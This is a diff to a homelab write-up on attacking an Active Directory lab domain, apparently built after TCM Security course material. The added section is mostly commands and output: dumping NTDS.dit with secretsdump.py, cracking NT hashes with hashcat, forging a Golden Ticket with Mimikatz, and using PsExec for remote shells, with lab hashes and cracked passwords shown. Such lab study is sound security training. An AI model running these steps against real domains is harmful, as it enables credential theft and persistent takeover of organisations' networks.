@@ -2,10 +2,7 @@
 
 ---
 
-# Important Note
-This Active Directory homelab environment was built with guidance from tcm security﻿. It is designed to provide hands-on experience with AD setup, configuration, and common attack techniques for cybersecurity learning and practice.
-
----
+This Active Directory homelab, built following guidance from TCM Security, provides hands-on experience in AD setup, configuration, and common attack techniques for cybersecurity practice and learning
 
 # Active Directory Lab
 
@@ -1017,4 +1014,162 @@ sekurlsa::credman      # List credential manager secrets
 
 Check for plaintext passwords and NTLM hashes based on mounted shares or sessions.
 
----
+# Attack Strategy for Internal Pentest
+
+- Account compromised
+- Quick wins: 
+	- pass the hash
+	- secrets dump
+	- pass the hash/password
+- Dig deeper
+	- enumerate (bloodhound, users, domain admins, sensitive VMs, etc)
+	- account access
+	- old vulnerabilities
+
+# Post-Domain Compromise Actions
+
+Once the domain is owned:
+
+- **Maximize value for the client**
+	- Repeat the process for verification
+	- Dump `NTDS.dit` and crack passwords
+	- Enumerate shares for sensitive data
+
+- **Maintain persistence**
+	- Plan for lost **Domain Admin (DA) access**
+	- Create a temporary **DA account** (remember to delete it)
+	- Use a **Golden Ticket** if needed
+
+## Dumping NTDS.dit
+`NTDS.dit` is the Active Directory database file used by Microsoft Windows Domain Controllers (**DCs**). It stores critical domain information, including:
+
+- User and computer accounts
+- Password hashes
+- Group memberships and permissions
+
+It is important because:
+
+- it contains NTLM & Kerberos password hashes, making it a prime target for attackers
+- if dumped using tools like `Mimikatz` or `secretsdump.py`, attackers can crack hashes and gain **Domain Admin access**
+- it enables **privilege escalation** and **persistent access** (`e.g.` Golden Ticket attacks).
+
+```bash
+secretsdump.py MARVEL.local/hawkeye:'Password1@'@hydra-dc.MARVEL.local -just-dc-ntlm > ntds.txt
+```
+
+```bash
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:21a84dbb8f81aa02316606b488a4a9eb:::
+MARVEL.local\tstark:1601:aad3b435b51404eeaad3b435b51404ee:35efba6f2e4bff313e474477bb3947b0:::
+MARVEL.local\SQLService:1602:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
+MARVEL.local\fcastle:1603:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+MARVEL.local\pparker:1604:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+bkVKFfXduD:1607:aad3b435b51404eeaad3b435b51404ee:2622b132931c05c7906da9d35e12fbb2:::
+hawkeye:1608:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
+HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:327be301d1b220fcc6612deab852b321:::
+THEPUNISHER$:1605:aad3b435b51404eeaad3b435b51404ee:4024a6cb78ffd9195b7f53697994ed32:::
+SPIDERMAN$:1606:aad3b435b51404eeaad3b435b51404ee:c8ad84ab1f78981322a0618060c0e82c:::
+[*] Cleaning up...
+```
+
+Get only the NT hashes from the response and try to crack them
+
+```bash
+# ntds.txt
+920ae267e048417fcfe00f49ecbd4b33
+31d6cfe0d16ae931b73c59d7e0c089c0
+21a84dbb8f81aa02316606b488a4a9eb
+35efba6f2e4bff313e474477bb3947b0
+f4ab68f27303bcb4024650d8fc5f973a
+64f12cddaa88057e06a81b54e73b949b
+64f12cddaa88057e06a81b54e73b949b
+2622b132931c05c7906da9d35e12fbb2
+43460d636f269c709b20049cee36ae7a
+327be301d1b220fcc6612deab852b321
+4024a6cb78ffd9195b7f53697994ed32
+c8ad84ab1f78981322a0618060c0e82c
+```
+
+```bash
+hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt --show > ntds_hashcat.txt
+```
+
+```bash
+# Check the users cracked hashes
+Administrator - 920ae267e048417fcfe00f49ecbd4b33:P@$$w0rd!
+Guest - 31d6cfe0d16ae931b73c59d7e0c089c0:
+MARVEL.local\SQLService - f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#
+MARVEL.local\fcastle - 64f12cddaa88057e06a81b54e73b949b:Password1
+MARVEL.local\pparker - 64f12cddaa88057e06a81b54e73b949b:Password1
+hawkeye - 43460d636f269c709b20049cee36ae7a:Password1@
+```
+
+## Golden Ticket
+A **Golden Ticket attack** is a **Kerberos** authentication exploit that allows an attacker to generate forged **TGTs** (Ticket Granting Tickets), granting them **persistent** and **unrestricted access** to an Active Directory (AD) environment.
+
+- **Obtain the KRBTGT Hash** – The attacker dumps the **KRBTGT account**'s NTLM hash from the **NTDS.dit** database on a domain controller.
+- **Forge a TGT** – Using `Mimikatz`, the attacker crafts a fake Kerberos TGT, setting any username, groups, or privileges.
+- **Gain Domain Access** – The forged ticket is used (via **Pass-the-Ticket** attack) to request service tickets (**TGS**), allowing access to any resource without authentication expiration.
+- **Persistence** – The ticket remains valid even if passwords change, as long as the KRBTGT hash is not reset twice.
+
+## Pass the Ticket - mimikatz
+Turn on `THEPUNISHER` (`192.168.31.93`) and `HYDRA-DC` (`192.168.31.90`) VMs.
+
+- Download `Mimikatz` on the Domain Controller VM
+- Run `cmd` as admin on the `HYDRA-DC`. Proceed to forging a golden ticket with `Mimikatz`
+
+```bash
+cd "C:\Users\fcastle\Downloads\mimikatz_trunk\x64"
+mimikatz.exe
+
+# Commands
+privilege::debug
+
+lsadump::lsa /inject /name:krbtgt
+```
+
+Get the Domain SID and NTLM hash of the `krbtgt` account from the output
+
+```bash
+S-1-5-21-1796002695-2329991732-2223296958
+21a84dbb8f81aa02316606b488a4a9eb
+```
+
+Back in `Mimikatz`, generate the **golden ticket**
+
+```bash
+kerberos::golden /User:MyAdministrator /domain:marvel.local /sid:S-1-5-21-1796002695-2329991732-2223296958 /krbtgt:21a84dbb8f81aa02316606b488a4a9eb /id:500 /ptt
+
+# id:500 - Administrator account
+# ptt - pass the ticket into the session
+```
+
+The attacker can use the forged ticket to access Kerberos-integrated resources. Since the TGT is signed and encrypted with the legitimate KRBTGT password hash, domain controllers recognize it as valid authentication. As a result, the domain controller issues **Ticket Granting Service (TGS)** tickets based on the forged TGT.
+
+To open a session with the generated golden ticket:
+
+```bash
+misc::cmd
+```
+
+```bash
+# In the new CMD, run privileged commands
+dir \\THEPUNISHER\c$
+```
+
+[Download](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) and use `psexec.exe` to run attacks against other computers or get a remote shell on them
+
+```bash
+cd "C:\Users\tstark\Downloads\PSTools>"
+PsExec.exe \\THEPUNISHER cmd.exe
+
+hostname
+```
+
+`Impacket` from the Kali VM can be used too for the Pass the Ticket attack using `secretdump.py` , `lookupsid.py`, `ticketer.py`, `psexec.py`.
+
+--- 
